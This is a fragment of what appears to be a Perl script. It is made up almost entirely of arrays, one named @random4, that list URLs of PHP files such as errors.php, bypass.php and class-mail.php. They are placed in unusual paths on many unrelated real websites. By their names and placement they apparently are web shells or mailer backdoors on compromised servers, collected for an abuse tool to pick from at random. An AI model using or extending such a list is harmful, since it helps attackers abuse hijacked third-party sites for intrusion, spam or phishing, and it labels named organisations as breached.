"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php"
);

my @random4  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
